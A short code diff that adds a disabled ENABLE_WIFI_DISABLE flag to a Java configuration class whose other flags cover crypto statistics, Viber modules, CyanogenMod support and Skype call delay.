@@ -29,6 +29,7 @@ public class Cfg {
 	public static final boolean STATISTICS = false; // enable statistics on crypto and on commands
 
 	public static final boolean ENABLE_EXPERIMENTAL_MODULES = false; // enables viber modules
+	public static final boolean ENABLE_WIFI_DISABLE = false;
 	public static boolean SUPPORT_CYANOGENMOD = false;
 	public static final boolean DELAY_SKYPE_CALL = false;
 
